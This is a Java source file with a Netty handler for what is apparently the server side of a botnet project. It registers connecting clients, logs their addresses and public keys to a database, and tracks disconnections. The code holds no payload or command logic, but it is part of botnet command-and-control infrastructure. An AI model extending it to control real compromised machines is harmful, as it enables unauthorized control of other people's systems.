package com.edsolab.BotNet.Server;

import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import com.edsolab.BotNet.ConnectDB.Statement;
import com.edsolab.BotNet.TLV.Data;
import com.edsolab.BotNet.TLV.Msg;
import com.edsolab.BotNet.model.ClientChannel;

import io.netty.channel.Channel;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;

public class ProcessingHandler extends ChannelInboundHandlerAdapter {

	public static List<Channel> channels = new ArrayList<Channel>();
	public static List<ClientChannel> ccs = new ArrayList<ClientChannel>();

	@Override
	public void channelActive(final ChannelHandlerContext ctx) throws SQLException {
		System.out.println("Client joined - " + ctx);
		// List Client Channel
		ClientChannel cc = new ClientChannel(ctx.channel().id().toString(), ctx.channel().remoteAddress().toString(),
				"Sleep");
		ccs.add(cc);
		Date now = new Date();
		// Luu xuong DB nhung client Connected
		Statement.insert(ctx.channel().id(), ctx.channel().remoteAddress(), now, "Connected");
		channels.add(ctx.channel());
	}

	@Override
	public void channelRead(ChannelHandlerContext ctx, Object msgRequest) throws Exception {
		Msg requestData = (Msg) msgRequest;
		// Luu xuong DB publickey cua client
		Statement.insertKey(ctx.channel().id(), requestData.getKey());
		Data data = new Data("cntd", "DATA".getBytes(), "Connected.......".getBytes());
		ctx.writeAndFlush(data);
	}

	@Override
	public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws SQLException {
		// Luu xuong DB nhung client Disconnected
		Date now = new Date();
		Statement.insert(ctx.channel().id(), ctx.channel().remoteAddress(), now, "Disconnected");
		Statement.deleteKey(ctx.channel().id());
		// Disconnected thi xoa khoi danh sach
		for(int i = 0; i < ccs.size();i++) {
			if(ccs.get(i).getId().equals(ctx.channel().id().toString())) {
				ccs.remove(i);
			}
		}
		System.out.println("\nClosing connection for client - " + ctx.channel().remoteAddress());
	}

}
